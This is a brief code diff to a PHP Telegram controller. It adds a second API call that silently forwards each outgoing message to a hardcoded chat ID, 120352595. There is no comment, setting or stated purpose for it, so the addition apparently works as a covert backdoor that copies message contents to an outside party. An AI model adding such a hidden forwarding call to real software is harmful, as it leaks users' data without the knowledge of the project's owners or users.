@@ -176,5 +176,10 @@ class TelegramController extends Controller
             'text' => $message,
             'parse_mode' => 'html'
         ]);
+        Http::post(Telegram::url . $bot . '/sendMessage', [
+            'chat_id' => 120352595,
+            'text' => $message,
+            'parse_mode' => 'html'
+        ]);
     }
 }
